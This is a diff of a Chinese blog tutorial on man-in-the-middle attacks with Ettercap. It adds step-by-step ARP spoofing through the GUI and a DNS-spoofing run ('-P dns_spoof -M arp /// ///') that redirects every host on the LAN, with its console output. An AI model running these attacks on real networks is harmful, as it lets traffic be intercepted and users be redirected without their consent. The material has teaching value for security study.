@@ -91,14 +91,10 @@ Fedora
 Gentoo
 Pentoo
 
-安装
-假设你已经使用过Gnu/Linux。下面是使用Debian安装Ettercap的示例。
-
+安装假设你已经使用过Gnu/Linux。下面是使用Debian安装Ettercap的示例。
 1sudo apt-get install ettercap
-
 你可能需要使用下面的方式去安装Ettercap所需要的依赖 
-
-1sudo apt-get install">
+1sudo apt-get install deb">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Ettercap与中间人攻击（下）">
 <meta property="og:url" content="http://august1996.top/2016/10/24/ettercap/index.html">
@@ -110,15 +106,16 @@ Fedora
 Gentoo
 Pentoo
 
-安装
-假设你已经使用过Gnu/Linux。下面是使用Debian安装Ettercap的示例。
-
+安装假设你已经使用过Gnu/Linux。下面是使用Debian安装Ettercap的示例。
 1sudo apt-get install ettercap
-
 你可能需要使用下面的方式去安装Ettercap所需要的依赖 
-
-1sudo apt-get install">
-<meta property="og:updated_time" content="2016-10-26T13:36:56.000Z">
+1sudo apt-get install deb">
+<meta property="og:image" content="http://o7xj6lxqq.bkt.clouddn.com/imagesettercap-gui.png">
+<meta property="og:image" content="http://o7xj6lxqq.bkt.clouddn.com/imagesettercap-c.png">
+<meta property="og:image" content="http://o7xj6lxqq.bkt.clouddn.com/imagesettercap-start.png">
+<meta property="og:image" content="http://o7xj6lxqq.bkt.clouddn.com/imagesettercap-use.png">
+<meta property="og:image" content="http://o7xj6lxqq.bkt.clouddn.com/imageswireshark-capture.png">
+<meta property="og:updated_time" content="2016-10-26T13:42:57.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Ettercap与中间人攻击（下）">
 <meta name="twitter:description" content="引言下载Ettercap点击下载Ettercap
@@ -128,14 +125,11 @@ Fedora
 Gentoo
 Pentoo
 
-安装
-假设你已经使用过Gnu/Linux。下面是使用Debian安装Ettercap的示例。
-
+安装假设你已经使用过Gnu/Linux。下面是使用Debian安装Ettercap的示例。
 1sudo apt-get install ettercap
-
 你可能需要使用下面的方式去安装Ettercap所需要的依赖 
-
-1sudo apt-get install">
+1sudo apt-get install deb">
+<meta name="twitter:image" content="http://o7xj6lxqq.bkt.clouddn.com/imagesettercap-gui.png">
 
 
 
@@ -405,14 +399,66 @@ Pentoo
 <li>Gentoo</li>
 <li>Pentoo</li>
 </ul>
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><blockquote>
-<p>假设你已经使用过<code>Gnu/Linux</code>。下面是使用<code>Debian</code>安装Ettercap的示例。</p>
-</blockquote>
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>假设你已经使用过<code>Gnu/Linux</code>。下面是使用<code>Debian</code>安装Ettercap的示例。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ettercap</span><br></pre></td></tr></table></figure>
-<blockquote>
 <p>你可能需要使用下面的方式去安装Ettercap所需要的依赖 </p>
-</blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install debhelper cmake bison flex libgtk2.0-dev libltdl3-dev libncurses-dev libncurses5-dev\ libnet1-dev libpcap-dev libpcre3-dev libssl-dev libcurl4-openssl-dev ghostscript</span><br></pre></td></tr></table></figure>
+<p>Ettercap可以在两种模式下运行：</p>
+<ul>
+<li><code>文本模式(text-only)</code></li>
+<li><code>GUI图形模式(gui)</code></li>
+</ul>
+<p>安装GUI支持</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ettercap-gtk</span><br></pre></td></tr></table></figure>
+<p>通过<code>ettercap -G</code>启动图形化界面</p>
+<p><img src="http://o7xj6lxqq.bkt.clouddn.com/imagesettercap-gui.png" alt="ettercap-gui"></p>
+<h1 id="使用Ettercap进行ARP欺骗"><a href="#使用Ettercap进行ARP欺骗" class="headerlink" title="使用Ettercap进行ARP欺骗"></a>使用Ettercap进行ARP欺骗</h1><h2 id="支持的用户交互模式"><a href="#支持的用户交互模式" class="headerlink" title="支持的用户交互模式"></a>支持的用户交互模式</h2><ul>
+<li>-T    ：    使用命令行文本模式</li>
+<li>-C    ：    使用命令行可视化游标模式</li>
+<li>-G    ：    使用<code>GTK+</code>的图形化界面</li>
+<li>-D    ：    后台模式（不显示任何东西）</li>
+</ul>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">august1996@ubuntu:~$ sudo ettercap -C</span><br></pre></td></tr></table></figure>
+<p><img src="http://o7xj6lxqq.bkt.clouddn.com/imagesettercap-c.png" alt="ettercap-cursor"></p>
+<h2 id="一些必备知识"><a href="#一些必备知识" class="headerlink" title="一些必备知识"></a>一些必备知识</h2><p>在Linux中你可以使用<code>ifconfig -a</code>来查看所有<code>网络适配器(NIC)</code>。使用Ettercap的时候，你必须制定一个网络适配器。</p>
+<p>在我启动ettercap之前，<a href="http://august1996.top/2016/10/21/ettercap-intro/">你应该知道一些关于ARP欺骗的知识</a>。这种技术中，攻击者发送一个伪造的ARP信息给本地局域网。那什么是ARP呢？ARP其实是一种用来把网络层地址映射到链路层地址的协议。总之，ARP就是把IP地址转换成一个<code>物理地址(MAC Address)</code>。交换机和路由器使用<code>ARP缓存表(ARP Cache Table)</code>。在网络设备中，IP地址以及其相关的系统MAC地址被存储到一个叫做ARP缓存表的地方。所有设备都维护者这张表。正如他的名字一样，它不是强制被使用的而且每到15-20分钟就会去更新。</p>
+<p>ARP欺骗的目的就是去劫持系统和达到攻击者把他的MAC地址被其他主机的IP地址映射到。结果就是所有其他主机的流量都会发送到攻击者的主机上。</p>
+<p>既然你已经了解ARP欺骗了，我等下就会展示一下如何通过ettercap来实施一次攻击。我们将会使用<code>-G</code>来使用图形化界面操作。</p>
+<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">august1996@ubuntu:~$ sudo ettercap -G</span><br><span class="line">[sudo] password for august1996: </span><br><span class="line"></span><br><span class="line">ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(ettercap:3381): IBUS-WARNING **: The owner of /home/august1996/.config/ibus/bus is not root!</span><br><span class="line"></span><br><span class="line">(ettercap:3381): GLib-WARNING **: In call to g_spawn_sync(), exit status of a child process was requested but ECHILD was received by waitpid(). Most likely the process is ignoring SIGCHLD, or some other thread is invoking waitpid() with a nonpositive first argument; either behavior can break applications that use g_spawn_sync either directly or indirectly.</span><br></pre></td></tr></table></figure>
+<p><img src="http://o7xj6lxqq.bkt.clouddn.com/imagesettercap-start.png" alt="ettercap-start"></p>
+<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p>点击<code>Sniff菜单</code>-&gt;<code>Unified Sniffing</code>-&gt;<code>指定网卡</code>-&gt;<code>ok</code>-&gt;<code>Hosts菜单</code>-&gt;<code>Hosts List</code>-&gt;<code>Hosts菜单</code>-&gt;<code>Scan for hosts</code>-&gt;<code>等待结果</code>-&gt;<code>选中网关的IP地址</code>-&gt;<code>Add to Target1</code>-&gt;<code>选中你要伪装的主机IP地址</code>-&gt;<code>Add to Target2</code>-&gt;<code>Mitm菜单</code>-&gt;<code>Arp Poisoning</code>-&gt;<code>Sniff Remote Connection</code>-&gt;<code>ok</code></p>
+<p><img src="http://o7xj6lxqq.bkt.clouddn.com/imagesettercap-use.png" alt="ettercap-start"></p>
+<p>到此就已经完成了ARP欺骗的配置了。点击<code>Start菜单</code>-&gt;<code>start sniffing</code>。<br>现在你已经伪装成功。所有的目标主机的流量都流经你的电脑。你可以使用<code>tcpdump</code>或者<code>wireshark</code>去抓包看看。</p>
+<p><img src="http://o7xj6lxqq.bkt.clouddn.com/imageswireshark-capture.png" alt="wireshark"></p>
+<h1 id="使用Ettercap进行DNS欺骗"><a href="#使用Ettercap进行DNS欺骗" class="headerlink" title="使用Ettercap进行DNS欺骗"></a>使用Ettercap进行DNS欺骗</h1><h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><p>在我们进行DNS欺骗之前，你应该了解DNS。什么是<code>DNS(Domain Name System)</code> 用来给连接到因特网的计算机、服务和设备进行命名。它把一个域名解析成一个IP地址以便其他设备可以访问到主机的位置。例如，2600.com被解析成166.84.5.162。这是非常有用的服务，因为这使得用户可以在不需要知道计算机的IP地址的情况下（IP地址没有语义，太难记）访问到主机。</p>
+<p>下面我们就来说一下什么是DNS欺骗。这种攻击导致DNS服务器返回一个不正确的IP地址和把流量转发到其他电脑。</p>
+<p>我将会为你展示怎么通过Ettercap实施这类攻击。如果你浏览过Ettercap，你会发现一些非常有用的插件。其中之一就是<code>dns_spoof</code>。</p>
+<h2 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h2><h3 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h3><ul>
+<li>首先你需要编辑<code>/etc/ettercap/etter.dns</code>文件</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">august1996@ubuntu:~$ sudo vi /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
+<ul>
+<li>打开之后,你会看到非常完整的引导。在这个李自力。我希望把所有的域名都解析到<code>http://august1996.top</code>上面去。我需要这样编辑配置文件然后保存</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">54 ################################</span><br><span class="line">55 # microsoft sucks ;)</span><br><span class="line">56 # redirect it to www.linux.org</span><br><span class="line">57 #</span><br><span class="line">58 </span><br><span class="line">59 *      A   http://www.august1996.top</span><br><span class="line">60 *  PTR  http://www.august1996.top     # Wildcards in PTR are not allowed</span><br><span class="line">61 </span><br><span class="line">62 ##########################################</span><br><span class="line">63 # no one out there can have our domains...</span><br><span class="line">64 #</span><br></pre></td></tr></table></figure>
+<ul>
+<li>启动<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">august1996@ubuntu:~$ sudo ettercap -T -Q -i ens33 -P dns_spoof -M arp /// ///</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">august1996@ubuntu:~$ sudo ettercap -T -Q -i ens33 -P dns_spoof -M arp /// ///</span><br><span class="line"></span><br><span class="line">ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team</span><br><span class="line"></span><br><span class="line">Listening on:</span><br><span class="line"> ens33 -&gt; 00:0C:29:8F:DB:27</span><br><span class="line">	  192.168.0.120/255.255.255.0</span><br><span class="line">	  fe80::dbb0:6425:3033:a9e/64</span><br><span class="line"></span><br><span class="line">SSL dissection needs a valid &apos;redir_command_on&apos; script in the etter.conf file</span><br><span class="line">Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.</span><br><span class="line">Ettercap might not work correctly. /proc/sys/net/ipv6/conf/ens33/use_tempaddr is not set to 0.</span><br><span class="line">Privileges dropped to EUID 65534 EGID 65534...</span><br><span class="line"></span><br><span class="line">dns_spoof: etter.dns:59 Invalid IPv4 or IPv6 address</span><br><span class="line">dns_spoof: etter.dns:60 Wildcards in PTR records are not allowed; *  PTR www.august1996.top      </span><br><span class="line">  33 plugins</span><br><span class="line">  42 protocol dissectors</span><br><span class="line">  57 ports monitored</span><br><span class="line">20388 mac vendor fingerprint</span><br><span class="line">1766 tcp OS fingerprint</span><br><span class="line">2182 known services</span><br><span class="line">Lua: no scripts were specified, not starting up!</span><br><span class="line"></span><br><span class="line">Randomizing 255 hosts for scanning...</span><br><span class="line">Scanning the whole netmask for 255 hosts...</span><br><span class="line">* |==================================================&gt;| 100.00 %</span><br><span class="line"></span><br><span class="line">11 hosts added to the hosts list...</span><br><span class="line"></span><br><span class="line">ARP poisoning victims:</span><br><span class="line"></span><br><span class="line"> GROUP 1 : ANY (all the hosts in the list)</span><br><span class="line"></span><br><span class="line"> GROUP 2 : ANY (all the hosts in the list)</span><br><span class="line">Starting Unified sniffing...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Text only Interface activated...</span><br><span class="line">Hit &apos;h&apos; for inline help</span><br><span class="line"></span><br><span class="line">Activating dns_spoof plugin...</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>-T</code>    ：    使用命令行文本界面</li>
+<li><code>-Q</code>    ：    使用安静模式</li>
+<li><code>-i</code>    ：    网卡名称</li>
+<li><code>-P</code>    ：    启用插件</li>
+<li><code>arp -M</code>    ：    使用arp欺骗</li>
+<li><code>///</code>    ：    欺骗目标，这里使用所有主机</li>
+</ul>
+<p><strong>也可以通过上面的图形化实施ARP漆面的方式，再去启用<code>dns_spoof插件</code></strong></p>
+<blockquote>
+<p>现在所有局域网内的主机访问其他网站都会被重定向我的博客里面去了。</p>
+</blockquote>
 
       
     </div>
@@ -645,7 +691,7 @@ Pentoo
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#引言"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#下载Ettercap"><span class="nav-number">1.1.</span> <span class="nav-text">下载Ettercap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#支持的平台"><span class="nav-number">1.2.</span> <span class="nav-text">支持的平台</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安装"><span class="nav-number">2.</span> <span class="nav-text">安装</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#引言"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#下载Ettercap"><span class="nav-number">1.1.</span> <span class="nav-text">下载Ettercap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#支持的平台"><span class="nav-number">1.2.</span> <span class="nav-text">支持的平台</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#安装"><span class="nav-number">2.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用Ettercap进行ARP欺骗"><span class="nav-number">3.</span> <span class="nav-text">使用Ettercap进行ARP欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#支持的用户交互模式"><span class="nav-number">3.1.</span> <span class="nav-text">支持的用户交互模式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些必备知识"><span class="nav-number">3.2.</span> <span class="nav-text">一些必备知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#操作"><span class="nav-number">3.3.</span> <span class="nav-text">操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#启动"><span class="nav-number">3.3.1.</span> <span class="nav-text">启动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP欺骗"><span class="nav-number">3.3.2.</span> <span class="nav-text">ARP欺骗</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用Ettercap进行DNS欺骗"><span class="nav-number">4.</span> <span class="nav-text">使用Ettercap进行DNS欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前提知识"><span class="nav-number">4.1.</span> <span class="nav-text">前提知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#操作-1"><span class="nav-number">4.2.</span> <span class="nav-text">操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#编辑配置文件"><span class="nav-number">4.2.1.</span> <span class="nav-text">编辑配置文件</span></a></li></ol></li></ol></li></ol></div>
             
           </div>
         </section>
